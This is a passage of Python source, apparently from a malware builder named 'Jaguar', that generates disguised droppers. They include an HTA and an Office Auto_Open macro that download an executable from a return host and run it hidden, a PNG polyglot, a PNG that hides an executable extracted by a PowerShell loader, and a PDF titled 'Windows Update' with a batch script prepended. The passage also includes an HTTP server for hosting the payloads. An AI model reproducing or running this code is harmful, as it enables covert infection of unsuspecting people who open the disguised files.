            '    sh.Run """" & dest & """", 0, False\r\n'
            "  End If\r\n"
            "  window.close\r\n"
            "End Sub\r\n"
            "</script></head><body></body></html>\r\n"
        )
        return self._escribir(self._out(self.nombre + ".hta"), hta)

    @staticmethod
    def _png_minimo():
        def chunk(tipo, data):
            return (struct.pack(">I", len(data)) + tipo + data +
                    struct.pack(">I", zlib.crc32(tipo + data) & 0xffffffff))
        sig = b"\x89PNG\r\n\x1a\n"
        ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
        idat = zlib.compress(b"\x00\xff\x00\x00")
        return sig + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")

    def generar_png_polyglot(self):
        png = self._png_minimo()
        cola = b"\r\n" + self._bat_compacto().encode("utf-8")
        self._escribir(self._out(self.nombre + ".png"), png + cola, binario=True)
        return self._escribir(self._out(self.nombre + ".png.cmd"), png + cola,
                              binario=True)

    def generar_png_stego(self):
        carrier = None
        for c in (os.path.join(self.raiz, "jaguar", "ui", "jaguar.png"),
                  os.path.join(self.raiz, "img", "jaguar.png")):
            if os.path.isfile(c):
                carrier = c
                break
        with open(carrier, "rb") as f:
            png = f.read() if carrier else self._png_minimo()
        exe = self._out(self.nombre + ".exe")
        datos = open(exe, "rb").read() if os.path.isfile(exe) else b""
        if not datos:
            self.log("[builder] aviso: no hay exe; genera el .exe antes del stego")
        MAGIC = b"JAGUARSTEGO"
        blob = png + datos + MAGIC + len(datos).to_bytes(8, "little")
        self._escribir(self._out(self.nombre + ".png"), blob, binario=True)
        loader = "\r\n".join([
            "@echo off",
            'set "IMG=%~dp0%~n0"',
            'powershell -NoP -C "$b=[IO.File]::ReadAllBytes($env:IMG);'
            "$m=[Text.Encoding]::ASCII.GetBytes('JAGUARSTEGO');"
            "$i=$b.Length-8; $n=[BitConverter]::ToInt64($b,$i);"
            "$x=New-Object byte[] $n; [Array]::Copy($b,$i-$n,$x,0,$n);"
            "$d=Join-Path $env:TEMP 'jaguar_stego.exe';"
            "[IO.File]::WriteAllBytes($d,$x); Start-Process $d -WindowStyle Hidden\"",
            "exit /b",
        ]) + "\r\n"
        self._escribir(self._out(self.nombre + ".png.cmd"), loader)
        self.log("[builder] png estego listo")
        return self._out(self.nombre + ".png")

    @staticmethod
    def _pdf_minimo(texto, prefijo=b""):
        objs = [
            b"<< /Type /Catalog /Pages 2 0 R >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 320 120] "
            b"/Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
            None,
            b"<< /Type /Font /Subtype /Type1 /BaseFont /Courier >>",
        ]
        stream = (b"BT /F1 10 Tf 12 60 Td ("
                  + texto.encode("latin-1", "replace") + b") Tj ET")
        objs[3] = (b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n"
                   + stream + b"\nendstream")
        out = bytearray(prefijo)
        out += b"%PDF-1.4\n"
        offsets = []
        for i, o in enumerate(objs, 1):
            offsets.append(len(out))
            out += str(i).encode() + b" 0 obj\n" + o + b"\nendobj\n"
        xref = len(out)
        out += b"xref\n0 " + str(len(objs) + 1).encode() + b"\n0000000000 65535 f \n"
        for off in offsets:
            out += ("%010d 00000 n \n" % off).encode()
        out += (b"trailer\n<< /Size " + str(len(objs) + 1).encode()
                + b" /Root 1 0 R >>\nstartxref\n" + str(xref).encode() + b"\n%%EOF")
        return bytes(out)

    def generar_pdf(self):
        bat = self._bat_compacto().encode("utf-8")
        pdf = self._pdf_minimo("Jaguar - Windows Update", prefijo=bat)
        self._escribir(self._out(self.nombre + ".pdf"), pdf, binario=True)
        return self._escribir(self._out(self.nombre + ".pdf.cmd"), pdf, binario=True)

    def generar_macro(self):
        macro = (
            "Sub Auto_Open()\r\n"
            "    Dim x As Object, s As Object, sh As Object\r\n"
            "    Dim url As String, dest As String\r\n"
            f'    url = "{self._url_exe()}"\r\n'
            f'    dest = Environ("TEMP") & "\\{self.nombre}.exe"\r\n'
            "    On Error Resume Next\r\n"
            '    Set x = CreateObject("MSXML2.XMLHTTP")\r\n'
            '    x.Open "GET", url, False\r\n'
            "    x.Send\r\n"
            "    If x.Status = 200 Then\r\n"
            '        Set s = CreateObject("ADODB.Stream")\r\n'
            "        s.Type = 1 : s.Open : s.Write x.responseBody\r\n"
            "        s.SaveToFile dest, 2 : s.Close\r\n"
            '        Set sh = CreateObject("WScript.Shell")\r\n'
            '        sh.Run """" & dest & """", 0, False\r\n'
            "    End If\r\n"
            "End Sub\r\n"
        )
        return self._escribir(self._out(self.nombre + "_macro.bas"), macro)

    # ------------------------------------------------------------------ todo
    def generar_todo(self, tipos=None):
        if tipos is None:
            tipos = ["py", "sh", "exe", "desktop", "command", "android"]
            if ES_WIN:
                tipos += ["bat", "vbs", "ps1", "lnk", "hta", "pdf", "png", "macro"]
        mapa = {
            "py": self.generar_py, "sh": self.generar_sh, "exe": self.generar_exe,
            "desktop": self.generar_desktop, "command": self.generar_command,
            "android": self.generar_android,
            "bat": self.generar_bat, "vbs": self.generar_vbs, "ps1": self.generar_ps1,
            "lnk": self.generar_lnk, "hta": self.generar_hta,
            "png": self.generar_png_polyglot, "png_stego": self.generar_png_stego,
            "pdf": self.generar_pdf, "macro": self.generar_macro,
        }
        res = {}
        for t in tipos:
            fn = mapa.get(t)
            if not fn:
                continue
            try:
                res[t] = fn()
            except Exception as e:
                self.log(f"[builder] ERROR generando {t}: {e}")
                res[t] = None
        self.log(f"[builder] SO del builder = {SO}")
        self.log(f"[builder] host de retorno = {self._host_url()} | "
                 f"fallback LAN = {self.fallback}")
        self.log("[builder] recuerda: deja '🌐 Servir dist' ACTIVO")
        return res

    # ------------------------------------------------------------------ http
    def servir_http(self, puerto=8080, directorio=None):
        if self._http is None:
            self._http = Servidor(puerto=puerto, log=self.log)
        return self._http.iniciar(directorio or self.dist)

    def detener_http(self):
        if self._http:
            self._http.detener()


# ============================================================ SERVIDOR ======
class _Handler(SimpleHTTPRequestHandler):
    def __init__(self, *a, directorio=None, **kw):
        super().__init__(*a, directory=directorio, **kw)

    def log_message(self, *a):
        pass


class Servidor:
    def __init__(self, puerto=8080, log=None):
        self.puerto = int(puerto)
        self.log = log or (lambda t: None)
        self.httpd = None
        self.hilo = None

    def iniciar(self, directorio):
        self.detener()
        handler = functools.partial(_Handler, directorio=directorio)
        self.httpd = ThreadingHTTPServer(("0.0.0.0", self.puerto), handler)
        self.hilo = __import__("threading").Thread(target=self.httpd.serve_forever,
                                                   daemon=True)
        self.hilo.start()
        self.log(f"[servidor] sirviendo {directorio} en http://0.0.0.0:{self.puerto}")
        return f"http://0.0.0.0:{self.puerto}"

    def detener(self):
        try:
            if self.httpd:
                self.httpd.shutdown()
                self.httpd.server_close()
        except Exception:
            pass
        self.httpd = None
        self.hilo = None